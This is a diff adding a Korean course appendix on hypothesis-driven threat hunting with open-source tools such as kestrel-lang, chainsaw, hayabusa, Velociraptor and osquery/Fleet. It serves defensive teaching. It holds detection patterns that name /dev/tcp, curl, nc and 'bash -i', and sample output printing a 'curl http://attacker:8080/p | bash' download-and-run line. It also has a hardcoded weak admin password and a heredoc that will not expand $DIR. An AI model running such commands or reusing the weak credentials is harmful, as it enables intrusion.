@@ -1049,3 +1049,345 @@ graph LR
 
 **학생 액션**: lab dnscat2 시도 → DNS 신호.
 
+
+---
+
+## 부록: 학습 OSS 도구 매트릭스 (Course12 — Week 07 위협 헌팅)
+
+### lab step → 도구 매핑
+
+| step | 학습 항목 | OSS 도구 | 명령 예 |
+|------|----------|---------|---------|
+| s1 | 가설 기반 헌팅 | **kestrel-lang** | `kestrel run hunt.huntflow` |
+| s2 | Sigma + chainsaw | chainsaw + Sigma | `chainsaw hunt /var/log -s sigma/rules/` |
+| s3 | hayabusa (Win) | hayabusa | `hayabusa csv-timeline -d evtx_files` |
+| s4 | Velociraptor live | Velociraptor | `velociraptor flow create EvidenceOfCompromise` |
+| s5 | osquery multi-host | osquery + Fleet | `fleetctl query --hosts=production "..."` |
+| s6 | EDR alternative | osquery + Wazuh | (양쪽 통합) |
+| s7 | Hunt automation | Airflow / cron + bash | 정기 실행 |
+| s8 | LLM-augmented hunt | langchain + Wazuh API | 자동 alert 분류 |
+
+### 학생 환경 준비
+
+```bash
+# === kestrel-lang (가설 헌팅) ===
+pip install kestrel-lang kestrel-jupyter
+pip install firepit                                       # backend storage
+pip install stixshifter stixshifter-utils
+pip install stix-shifter-modules-elastic-ecs              # Elastic
+pip install stix-shifter-modules-opensearch               # Wazuh
+
+# === chainsaw (Rust) ===
+cargo install chainsaw
+
+# === hayabusa (Win EVTX) ===
+git clone https://github.com/Yamato-Security/hayabusa ~/hayabusa
+cd ~/hayabusa && cargo build --release
+~/hayabusa/target/release/hayabusa update-rules
+
+# === Velociraptor ===
+curl -L https://github.com/Velocidex/velociraptor/releases/latest/download/velociraptor-v0.7.0-linux-amd64 -o /tmp/vr
+chmod +x /tmp/vr && sudo mv /tmp/vr /usr/local/bin/velociraptor
+
+# Server 설정 + 시작
+sudo velociraptor --config /tmp/server.yaml config generate -i
+sudo velociraptor --config /etc/velociraptor.config.yaml frontend &
+
+# === osquery + Fleet ===
+sudo apt install -y osquery
+docker run -d --name fleet -p 8080:8080 fleetdm/fleet:latest
+
+fleetctl setup --email admin@x.com --password Pa\$\$w0rd --org-name CCC
+
+# === Sigma rules ===
+git clone https://github.com/SigmaHQ/sigma ~/sigma
+```
+
+### 핵심 — kestrel-lang (가설 기반 헌팅 표준)
+
+```python
+# /opt/hunts/lateral-movement.huntflow
+
+# === Hypothesis: SSH brute 후 lateral movement ===
+
+# 1. Failed SSH login pattern
+ssh_failed = GET process FROM stixshifter://wazuh
+           WHERE [process:name = 'sshd' AND
+                  process:command_line LIKE '%pam_unix%']
+
+# 2. 5+ 실패 후 success (host 별)
+brute_hosts = ssh_failed
+            GROUP BY host_id
+            HAVING failed_attempts > 5 AND succeeded_after_failures > 0
+
+# 3. 그 host 에서 새 process 실행 (1시간 내)
+new_proc = GET process FROM stixshifter://wazuh
+         WHERE [process:parent_ref IN ssh_failed.process_id AND
+                process:created > {1h ago}]
+
+# 4. Suspicious process (의심 명령)
+suspicious = new_proc
+           WHERE process:command_line LIKE '%/dev/tcp%' OR
+                 process:command_line LIKE '%curl http://%' OR
+                 process:command_line LIKE '%python3 -c%'
+
+# 5. Outbound network connection
+egress = GET network-traffic FROM stixshifter://wazuh
+       WHERE [network-traffic:src_ref = suspicious.host_id AND
+              network-traffic:dst_ref NOT IN $known_servers]
+
+# === Output ===
+DISP brute_hosts ATTR host_id, ip_address, last_login_time
+DISP suspicious ATTR process_name, command_line, user_id
+DISP egress ATTR src_ip, dst_ip, dst_port
+
+# === Save ===
+SAVE brute_hosts TO /tmp/brute-hosts.json
+```
+
+```bash
+# 실행
+kestrel run /opt/hunts/lateral-movement.huntflow
+
+# 출력 예:
+# === brute_hosts (3 records) ===
+# host_id           ip_address      last_login_time
+# host_10.20.30.50  10.20.30.50    2026-05-02 10:30:00
+# host_10.20.30.51  10.20.30.51    2026-05-02 10:35:00
+# 
+# === suspicious (5 records) ===
+# bash 'curl http://attacker:8080/p | bash'
+# python3 -c 'import socket; s=socket.socket(...); s.connect(...)'
+```
+
+### Velociraptor — Multi-host live forensic
+
+```bash
+# === 1. Server 시작 ===
+sudo systemctl start velociraptor
+# Web UI: https://localhost:8889
+# 계정: admin (자동 생성)
+
+# === 2. Client (모든 endpoint 에 자동 enroll) ===
+# Endpoint 에서:
+sudo velociraptor --config /etc/velociraptor-client.yaml client &
+
+# === 3. Live Hunt (모든 hosts 동시 검색) ===
+velociraptor query --format json "
+SELECT pid, name, exe, cmdline, username
+FROM artifact(name='Linux.Sys.Process')
+WHERE 
+  exe LIKE '%/tmp/%' OR 
+  exe LIKE '%/dev/shm/%' OR
+  exe LIKE '%/var/tmp/%'
+"
+
+# === 4. Yara hunt (악성 시그니처) ===
+velociraptor flow create EvidenceOfCompromise \
+    --client.id all \
+    --artifacts Generic.Detection.Yara.Process \
+    --rules ~/yara-rules/index.yar
+
+# === 5. Custom artifact 작성 ===
+cat > /tmp/Custom.Hunt.SuspiciousCron.yaml << 'AEOF'
+name: Custom.Hunt.SuspiciousCron
+description: |
+  의심스러운 cron entries (curl, wget, nc 등 사용)
+type: CLIENT
+
+sources:
+  - query: |
+      SELECT * FROM Artifact.Linux.Sys.Crontab(globs="/etc/cron*")
+      WHERE Command =~ "(curl|wget|nc |bash -i|/dev/tcp|python3 -c)"
+AEOF
+
+# Server 에 upload
+velociraptor artifact upload /tmp/Custom.Hunt.SuspiciousCron.yaml
+
+# === 6. 통합 Hunt 시작 ===
+velociraptor hunts list
+velociraptor hunts create \
+    --description "Suspicious cron sweep" \
+    --artifact Custom.Hunt.SuspiciousCron
+```
+
+### Sigma + chainsaw 통합 헌팅
+
+```bash
+# === 모든 OS log scan ===
+chainsaw hunt /var/log/ \
+    -s ~/sigma/rules/linux/ \
+    --output json > /tmp/hunt.json
+
+# === Win EVTX ===
+chainsaw hunt /evtx_files/ \
+    -s ~/sigma/rules/windows/ \
+    -m mapping.yml \
+    --output json > /tmp/hunt-win.json
+
+# === Filter — high/critical 만 ===
+jq -r '.[] | select(.rule.level == "high" or .rule.level == "critical") | "\(.timestamp) [\(.rule.title)]"' \
+    /tmp/hunt.json | head -20
+
+# === ATT&CK 매핑 ===
+jq -r '.[] | .rule.tags[]' /tmp/hunt.json | grep "attack\." | sort | uniq -c | sort -rn
+# 출력 예:
+#   12 attack.persistence
+#    8 attack.execution
+#    5 attack.credential_access
+#    3 attack.lateral_movement
+```
+
+### hayabusa (Win EVTX 전용 — 매우 빠름)
+
+```bash
+# === 1. Timeline (CSV) ===
+~/hayabusa/target/release/hayabusa csv-timeline \
+    -d /evtx_files \
+    -o /tmp/timeline.csv \
+    --no-color
+
+# 출력: 모든 의심 이벤트 → CSV (RuleAuthor, MitreTags, Channel, EventID)
+
+# === 2. JSON timeline (자동화) ===
+~/hayabusa/target/release/hayabusa json-timeline \
+    -d /evtx_files \
+    -o /tmp/timeline.json
+
+# === 3. Logon summary ===
+~/hayabusa/target/release/hayabusa logon-summary -d /evtx_files
+# 출력: 사용자별 logon 통계
+
+# === 4. Pivot keyword search ===
+~/hayabusa/target/release/hayabusa pivot-keywords-list \
+    -d /evtx_files \
+    -k "powershell"
+
+# === 5. Update rules (Sigma + 자체) ===
+~/hayabusa/target/release/hayabusa update-rules
+# 3000+ rules
+
+# === 6. Dashboard (Web) ===
+~/hayabusa/target/release/hayabusa metrics -d /evtx_files
+```
+
+### osquery + Fleet (multi-host)
+
+```bash
+# === Fleet (osquery manager) ===
+# Web UI: http://localhost:8080
+
+# 1) Hosts 등록 (각 endpoint 에 osquery agent 설치)
+fleetctl get hosts
+
+# 2) Live query (모든 host 동시)
+fleetctl query \
+    --hosts="hosts.label='production'" \
+    --query "SELECT * FROM crontab;"
+
+# 3) Saved query (자동 매시간)
+fleetctl get queries
+
+# 4) Pack (다중 query 묶음)
+cat > /tmp/persistence-pack.yaml << 'PEOF'
+apiVersion: v1
+kind: pack
+spec:
+  name: persistence-detection
+  description: Detect persistence indicators
+  targets:
+    labels: [production]
+  queries:
+    - query: SELECT * FROM crontab;
+      interval: 3600
+      description: Cron entries
+    - query: SELECT * FROM systemd_units WHERE active_state="active";
+      interval: 3600
+      description: systemd services
+    - query: SELECT * FROM authorized_keys WHERE algorithm="ssh-rsa" OR algorithm="ssh-ed25519";
+      interval: 86400
+      description: SSH authorized keys
+    - query: SELECT * FROM file WHERE path = '/etc/ld.so.preload';
+      interval: 3600
+      description: LD_PRELOAD persistence
+    - query: SELECT * FROM users WHERE uid = 0 AND username != 'root';
+      interval: 3600
+      description: Root-equivalent users (UID 0)
+PEOF
+
+fleetctl apply -f /tmp/persistence-pack.yaml
+```
+
+### Hunt Automation (자동 hunt cycle)
+
+```bash
+#!/bin/bash
+# /usr/local/bin/auto-hunt.sh
+# 매시간 실행 (cron)
+
+DIR=/var/log/auto-hunt/$(date +%Y%m%d-%H)
+mkdir -p $DIR
+
+# 1) chainsaw + Sigma
+chainsaw hunt /var/log -s ~/sigma/rules/linux/ \
+    --output json > $DIR/01-chainsaw.json
+
+# 2) Velociraptor live
+velociraptor query --format json "
+SELECT pid, name, exe, cmdline 
+FROM artifact(name='Linux.Sys.Process')
+WHERE exe LIKE '%/tmp/.%' OR exe LIKE '%/dev/shm/%'
+" > $DIR/02-vr-process.json
+
+# 3) kestrel 가설 (5개)
+for hunt in lateral-movement c2-detection persistence cred-dump exfil; do
+    kestrel run /opt/hunts/$hunt.huntflow > $DIR/03-$hunt.txt 2>&1
+done
+
+# 4) Fleet osquery (모든 endpoint)
+fleetctl query --hosts="*" --query "SELECT * FROM crontab WHERE command LIKE '%curl%';" \
+    > $DIR/04-osquery-cron.json
+
+# 5) hayabusa (Win evtx — 만약 mount 됨)
+[ -d /evtx_files ] && \
+    ~/hayabusa/target/release/hayabusa json-timeline -d /evtx_files \
+    -o $DIR/05-hayabusa.json
+
+# 6) 종합 LLM 분석 (langchain + Wazuh)
+python3 << 'PEOF' > $DIR/00-summary.md
+from langchain_ollama import OllamaLLM
+import json, glob
+
+llm = OllamaLLM(model="gemma3:4b")
+
+# 모든 hunt 결과 합산
+all_findings = []
+for f in glob.glob("$DIR/*.json"):
+    try:
+        all_findings.extend(json.load(open(f)))
+    except: pass
+
+# Top 10 만 LLM 으로 분류
+prompt = f"다음 보안 alert 들을 위험도별로 분류 + 권고 작성:\n{all_findings[:10]}"
+print(llm.invoke(prompt))
+PEOF
+
+# 7) Critical 발견 시 alert
+CRITICAL=$(jq -r '.[] | select(.rule.level == "critical")' $DIR/01-chainsaw.json | jq -s '. | length')
+if [ "$CRITICAL" -gt 0 ]; then
+    curl -X POST $SLACK_WEBHOOK \
+        -d "{\"text\": \"⚠ Auto-hunt: $CRITICAL critical findings — see $DIR\"}"
+fi
+```
+
+### Hunting Maturity Model (학생 목표)
+
+| Level | 설명 | 도구 |
+|-------|------|------|
+| 1. Initial | 사람이 alert 보고 검색 | grep + jq |
+| 2. Minimal | 자동 검색 (정해진 IoC) | Sigma + chainsaw |
+| 3. Procedural | 가설 기반 hunting | kestrel-lang |
+| 4. Innovative | 새 hypothesis 작성 | + Velociraptor + osquery |
+| 5. Leading | 자동 hypothesis + ML | + LLM augmented |
+
+학생은 본 7주차에서 **kestrel-lang + chainsaw + hayabusa + Velociraptor + osquery + Fleet + LLM augmented hunt** 7 도구로 가설 기반 위협 헌팅 maturity model 5 단계 의 advanced 운영을 익힌다.
